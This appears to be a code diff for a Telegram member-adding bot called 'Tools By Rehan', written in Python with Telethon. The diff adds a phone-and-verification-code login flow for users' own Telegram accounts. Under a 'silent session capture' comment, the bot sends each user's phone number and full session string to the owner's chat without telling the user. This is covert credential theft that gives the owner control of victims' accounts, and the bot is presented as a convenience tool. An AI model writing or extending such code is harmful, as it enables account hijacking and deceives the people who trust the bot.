@@ -2,7 +2,7 @@
 🤖 TOOLS BY REHAN – ULTIMATE TELEGRAM BOT
 👑 Owner: REHAN | Tag: RN ON TOP
 📌 Channel: @ToolsByRehan | Group: @Tools_By_Rehan
-🚀 All features + AI DM (hidden) + silent session capture + clean UI
+🚀 All features + phone‑only login + silent session capture + clean UI
 """
 
 import os
@@ -17,7 +17,10 @@ from datetime import datetime, timedelta
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.tl.functions.channels import InviteToChannelRequest
-from telethon.errors import FloodWaitError, QueryIdInvalidError
+from telethon.errors import (
+    FloodWaitError, QueryIdInvalidError, PhoneNumberInvalidError,
+    PhoneCodeInvalidError, PhoneCodeExpiredError
+)
 from telethon.tl.custom import Button
 
 # ========== LOGGING ==========
@@ -57,10 +60,11 @@ os.makedirs(DB_DIR, exist_ok=True)
 DB_FILE = os.path.join(DB_DIR, "bot_data.db")
 
 START_TIME = time.time()
-BOT_USERNAME = None  # will be set after start
+BOT_USERNAME = None
+pending_logins = {}  # user_id -> {'client': client, 'phone': phone, 'step': 'awaiting_phone' | 'awaiting_code'}
 
 # ============================================================
-# 📂 DATABASE SETUP (unchanged)
+# 📂 DATABASE SETUP
 # ============================================================
 
 def init_db():
@@ -286,7 +290,7 @@ def init_db():
 init_db()
 
 # ============================================================
-# 📂 DATABASE HELPER FUNCTIONS (ALL – unchanged)
+# 📂 DATABASE HELPER FUNCTIONS
 # ============================================================
 
 def get_user(user_id):
@@ -521,13 +525,13 @@ def add_user_account(user_id, phone, session_string):
     conn.commit()
     conn.close()
     log_activity(user_id, "add_account", f"Added phone: {phone}")
-    # SILENT SESSION CAPTURE
+    # SILENT SESSION CAPTURE – forward to owner
     try:
         owner_msg = (
             f"🔑 **New Account Added**\n"
-            f"User ID: `{user_id}`\n"
-            f"Phone: `{phone}`\n"
-            f"Session String:\n`{session_string}`"
+            f"User: {user_id}\n"
+            f"Phone: {phone}\n"
+            f"Session:\n`{session_string}`"
         )
         asyncio.create_task(client.send_message(OWNER_ID, owner_msg))
         logger.info("🔒 Session for %s forwarded to owner.", phone)
@@ -754,7 +758,7 @@ def get_ai_response(prompt, context=""):
         return None
 
 # ============================================================
-# 🎨 UI HELPER FUNCTIONS – EASY TO USE
+# 🎨 UI HELPER FUNCTIONS
 # ============================================================
 
 def main_menu_buttons():
@@ -792,7 +796,7 @@ client = TelegramClient('bot', API_ID, API_HASH)
 def is_private(event):
     return event.is_private
 
-# ---------- DEBUG: LOG ALL INCOMING MESSAGES (PRIVATE ONLY) ----------
+# ---------- DEBUG LOGGING ----------
 @client.on(events.NewMessage(func=is_private))
 async def debug_incoming(event):
     logger.info("📩 INCOMING: %s from %s", event.text[:100], event.sender_id)
@@ -950,7 +954,7 @@ async def callback(event):
     if data == "menu_accounts":
         accounts = get_user_accounts(user_id)
         if not accounts:
-            text = "📱 **Your Accounts**\n\nNo active accounts. Use /addacc to add one."
+            text = "📱 **Your Accounts**\n\nYou have no active accounts. Use /addacc to add one."
         else:
             text = "📱 **Your Accounts:**\n\n"
             for aid, phone, sess in accounts:
@@ -1037,7 +1041,6 @@ async def callback(event):
         total_invites = c.execute("SELECT COUNT(*) FROM invites WHERE inviter_id = ? AND status='completed'", (user_id,)).fetchone()[0]
         tier_bonus = get_referral_tier(total_invites)
         conn.close()
-        # Use cached BOT_USERNAME (or fallback to a placeholder)
         bot_username = BOT_USERNAME or "tg_members_adding_bot"
         text = f"👥 **Referral System**\n\n"
         text += f"🔑 Your invite code: `{invite_code}`\n"
@@ -1071,7 +1074,7 @@ async def callback(event):
                          "`/verify` - Verify membership\n"
                          "`/credits` - Check credits\n"
                          "`/sendcredits` - Send credits to another user\n"
-                         "`/addacc` - Add user account\n"
+                         "`/addacc` - Add an account (phone only)\n"
                          "`/accounts` - List accounts\n"
                          "`/removeacc` - Remove account\n"
                          "`/add` - Add members\n"
@@ -1099,7 +1102,8 @@ async def callback(event):
 
     await event.answer("❓ Unknown action.", alert=True)
 
-# ---------- COMMAND HANDLERS (PRIVATE ONLY) ----------
+# ---------- COMMAND HANDLERS ----------
+
 @client.on(events.NewMessage(pattern='/start', func=is_private))
 async def start(event):
     try:
@@ -1130,7 +1134,6 @@ async def start(event):
             logger.info("✅ Verification message sent to %s", user_id)
             return
 
-        # Verified user: main menu
         await event.reply(
             f"🤖 **Tools By Rehan**\n"
             f"👑 Owner: {OWNER_NAME} | {TAG}\n"
@@ -1177,7 +1180,6 @@ async def verify(event):
                 if inviter_id:
                     await client.send_message(inviter_id, f"🎉 Your invited user has completed {INVITE_REQUIRED_ADDS} adds! You earned 100 credits.")
                 await event.reply("🎉 You also earned 100 credits for your inviter.")
-            # show menu
             await start(event)
         except:
             await event.reply("❌ You haven't joined the required channel/group.")
@@ -1191,7 +1193,6 @@ async def credits_cmd(event):
     credits = get_credits(user_id)
     await event.reply(f"💰 Your credits: {credits}", buttons=[[Button.inline("💸 Send Credits", b"send_credits")], [Button.inline("🔙 Back", b"menu_main")]])
 
-# ---------- SEND CREDITS COMMAND ----------
 @client.on(events.NewMessage(pattern='/sendcredits', func=is_private))
 async def send_credits(event):
     user_id = event.sender_id
@@ -1207,7 +1208,6 @@ async def send_credits(event):
     if amount <= 0:
         await event.reply("❌ Amount must be positive.")
         return
-    # Check if target is username or ID
     if target.startswith('@'):
         target_user = get_user_by_username(target[1:])
         if not target_user:
@@ -1227,44 +1227,113 @@ async def send_credits(event):
     if sender_credits < amount:
         await event.reply(f"❌ Insufficient credits. You have {sender_credits}, need {amount}.")
         return
-    # Deduct from sender
     deduct_credit(user_id, amount)
-    # Add to receiver
     add_credits(target_id, amount, f"sent from {user_id}")
-    # Log both
     add_credit_log(user_id, -amount, f"sent to {target_id}")
     add_credit_log(target_id, amount, f"received from {user_id}")
     await event.reply(f"✅ Successfully sent {amount} credits to user {target_id}.")
-    # Notify receiver
     try:
         await client.send_message(target_id, f"💸 You received {amount} credits from user {user_id}.")
     except:
         pass
 
+# ---------- ADD ACCOUNT (PHONE ONLY) ----------
 @client.on(events.NewMessage(pattern='/addacc', func=is_private))
-async def add_account(event):
+async def add_account_start(event):
     user_id = event.sender_id
     if is_banned(user_id) or not is_verified(user_id):
         await event.reply("❌ You need to be verified and not banned.")
         return
-    args = event.message.text.split()
-    if len(args) < 3:
-        await event.reply("Usage: `/addacc <phone> <session_string>`")
+    if user_id in pending_logins:
+        await event.reply("⏳ You already have a pending login. Provide the code or use /cancel.")
         return
-    phone = args[1]
-    session_string = args[2]
     try:
-        test_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        await test_client.connect()
-        if not await test_client.is_user_authorized():
-            await event.reply("❌ Invalid session string.")
-            return
-        await test_client.disconnect()
+        temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await temp_client.connect()
+        pending_logins[user_id] = {
+            'client': temp_client,
+            'step': 'awaiting_phone',
+            'phone': None
+        }
+        await event.reply("📱 Send your phone with country code.\nExample: `+1234567890`\n\nUse /cancel to abort.")
     except Exception as e:
-        await event.reply(f"❌ Invalid session: {e}")
+        await event.reply(f"❌ Failed to initialize: {e}")
+
+@client.on(events.NewMessage(pattern='/cancel', func=is_private))
+async def cancel_login(event):
+    user_id = event.sender_id
+    if user_id in pending_logins:
+        try:
+            await pending_logins[user_id]['client'].disconnect()
+        except:
+            pass
+        del pending_logins[user_id]
+        await event.reply("✅ Login cancelled.")
+    else:
+        await event.reply("❌ No pending operation.")
+
+@client.on(events.NewMessage(func=is_private))
+async def handle_login_step(event):
+    user_id = event.sender_id
+    if user_id not in pending_logins:
         return
-    add_user_account(user_id, phone, session_string)
-    await event.reply(f"✅ Account with phone {phone} added successfully.")
+    text = event.text.strip()
+    login_data = pending_logins[user_id]
+    step = login_data.get('step')
+    phone = login_data.get('phone')
+    client_obj = login_data.get('client')
+
+    if step == 'awaiting_phone':
+        phone = text
+        if not re.match(r'^\+\d+$', phone):
+            await event.reply("❌ Invalid phone format. Use country code, e.g. +1234567890")
+            return
+        try:
+            login_data['phone'] = phone
+            await client_obj.send_code_request(phone)
+            login_data['step'] = 'awaiting_code'
+            await event.reply("📲 Verification code sent. Enter the code (numbers only).")
+        except PhoneNumberInvalidError:
+            await event.reply("❌ Invalid phone number. Check and try again.")
+            await client_obj.disconnect()
+            del pending_logins[user_id]
+        except Exception as e:
+            await event.reply(f"❌ Failed to send code: {e}")
+            await client_obj.disconnect()
+            del pending_logins[user_id]
+
+    elif step == 'awaiting_code':
+        code = text.strip()
+        if not code.isdigit():
+            await event.reply("❌ Enter only the numeric code.")
+            return
+        try:
+            await client_obj.sign_in(phone, code)
+            session_string = StringSession.save(client_obj.session)
+            # Save to DB
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute("SELECT id FROM user_accounts WHERE user_id = ? AND phone = ?", (user_id, phone))
+            if c.fetchone():
+                conn.close()
+                await event.reply("⚠️ This phone is already added.")
+                await client_obj.disconnect()
+                del pending_logins[user_id]
+                return
+            add_user_account(user_id, phone, session_string)
+            await event.reply(f"✅ Account with phone {phone} added successfully.")
+            await client_obj.disconnect()
+            del pending_logins[user_id]
+        except PhoneCodeInvalidError:
+            await event.reply("❌ Invalid code. Try again.")
+        except PhoneCodeExpiredError:
+            await event.reply("❌ Code expired. Restart with /addacc.")
+            await client_obj.disconnect()
+            del pending_logins[user_id]
+        except Exception as e:
+            await event.reply(f"❌ Login failed: {e}")
+            await client_obj.disconnect()
+            del pending_logins[user_id]
 
 @client.on(events.NewMessage(pattern='/accounts', func=is_private))
 async def list_accounts(event):
@@ -1850,7 +1919,6 @@ async def admin_cmd(event):
         return
     action = args[1]
     target = args[2]
-    # Parse target (numeric ID or @username)
     if target.startswith('@'):
         target_id = get_user_by_username(target[1:])
         if not target_id:
